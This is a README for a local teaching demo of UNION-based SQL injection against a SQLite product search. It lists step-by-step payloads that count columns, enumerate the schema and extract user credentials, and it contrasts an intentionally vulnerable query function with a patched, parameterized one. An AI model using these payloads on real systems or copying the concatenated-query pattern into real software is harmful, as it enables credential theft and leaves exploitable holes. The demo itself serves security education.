# UNION-Based SQL Injection Demo

## Project Structure
- `database.py` — SQLite database connection and schema/seed setup (`products` and `users` tables).
- `queries.py` — Contains both `search_products_vulnerable()` (flawed string concatenation) and `search_products_patched()` (parameterized query mitigation).
- `app.py` — Local HTTP web server and UI showing the search bar, executed SQL query, and results.

## How to Run
```bash
python3 app.py
```
Open `http://127.0.0.1:8000` in your browser.

## Demo Payloads (in order)
1. **Column Count (Recon):**
   - `' ORDER BY 5--` (succeeds)
   - `' ORDER BY 6--` (fails with out-of-range error -> confirms 5 columns)
2. **Displayed Columns:**
   - `' UNION SELECT 111, 222, 333, 444, 555--` (shows `222` and `333` -> columns 2 and 3 render on screen)
3. **Enumerate Tables & Schema (SQLite):**
   - `' UNION SELECT 111, name, sql, 444, 555 FROM sqlite_master WHERE type='table'--`
4. **Extract Credentials:**
   - `' UNION SELECT 111, username, password, 444, 555 FROM users--`
5. **Verify Mitigation:**
   - Switch to **Patched** mode in the UI and re-run payload #4 to show the exploit is blocked.
